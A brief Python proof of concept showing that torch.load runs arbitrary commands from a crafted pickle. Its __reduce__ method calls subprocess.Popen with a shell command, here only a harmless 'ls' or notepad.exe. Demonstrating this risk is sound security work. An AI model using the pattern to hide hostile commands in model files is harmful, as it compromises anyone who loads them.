import torch
import subprocess

class Demo:
    def __reduce__(self):
        return (
            subprocess.Popen,
            #linux
            (("/bin/sh","-c","ls"),),
            #window
            (("notepad.exe"),),
        )
    
# step 1    
# torch.save(Demo(),"demo.pth")

# step 2
model = torch.load("demo.pth",map_location=torch.device('cpu'))
